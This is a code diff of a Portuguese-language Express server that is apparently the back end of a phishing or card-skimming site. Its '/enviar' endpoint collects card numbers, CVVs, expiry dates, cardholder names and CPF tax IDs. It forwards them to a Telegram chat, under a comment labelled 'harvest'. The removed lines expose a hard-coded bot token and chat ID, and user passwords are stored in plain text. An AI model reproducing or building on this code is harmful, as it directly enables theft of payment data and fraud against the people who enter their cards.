@@ -1,7 +1,6 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
-const fetch = require("node-fetch");
 const app = express();
 
 app.use(express.json());
@@ -17,7 +16,7 @@ app.get('/', (req, res) => {
 // Inicia o servidor na porta do Railway ou 3000 localmente
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Servidor rodando na porta ${PORT}`);
+  console.log(`🚀 Servidor rodando na porta ${PORT}`);
 });
 
 //REGISTRO
@@ -30,7 +29,6 @@ app.post('/register', (req, res) => {
     return res.json({ success: false, message: 'Campos obrigatórios não preenchidos.' });
   }
 
-  // Verifica se já existe
   if (fs.existsSync(usersFile)) {
     const existingUsers = fs.readFileSync(usersFile, 'utf-8').split('\n');
     const exists = existingUsers.some(line => {
@@ -43,13 +41,12 @@ app.post('/register', (req, res) => {
     }
   }
 
-  // Salva novo usuário
   const userLine = `${username}|${password}|${fullname}\n`;
   fs.appendFileSync(usersFile, userLine);
   res.json({ success: true });
 });
 
-//login
+// LOGIN
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
 
@@ -85,47 +82,46 @@ app.post('/login', (req, res) => {
   });
 });
 
-//TELEGRAM COLHEITA
+// TELEGRAM ENVIO
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
-const TELEGRAM_TOKEN = "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
-const CHAT_ID = "-1002852733056"; 
+if (!TELEGRAM_TOKEN || !CHAT_ID) {
+  console.warn("⚠️ AVISO: TELEGRAM_TOKEN ou CHAT_ID não configurados nas variáveis de ambiente!");
+}
 
 app.post("/enviar", async (req, res) => {
-    try {
-        const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body;
+  try {
+    const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body;
 
-        const mensagem = `
+    const mensagem = `
 💳 Novo Cartão:
 Número: ${cardNumber}
 CVV: ${cardcvvName}
 Validade: ${expiry}
 Nome: ${cardholderNameC}
 Cpf: ${cardholderIdentificationNumber}
-        `;
+    `;
 
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: mensagem
-            })
-        });
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensagem
+      })
+    });
 
-        const data = await response.json();
-        console.log("Resposta do Telegram:", data);
+    const data = await response.json();
+    console.log("📩 Resposta do Telegram:", data);
 
-        if (!data.ok) {
-            res.status(500).send(`Erro do Telegram: ${data.description}`);
-        } else {
-            res.send("Mensagem enviada com sucesso para o Telegram!");
-        }
-    } catch (error) {
-        console.error("Erro no envio:", error.message, error.stack);
-        res.status(500).send("Erro no servidor");
+    if (!data.ok) {
+      res.status(500).send(`Erro do Telegram: ${data.description}`);
+    } else {
+      res.send("Mensagem enviada com sucesso para o Telegram!");
     }
+  } catch (error) {
+    console.error("❌ Erro no envio:", error.message, error.stack);
+    res.status(500).send("Erro no servidor");
+  }
 });
-
-
-
-
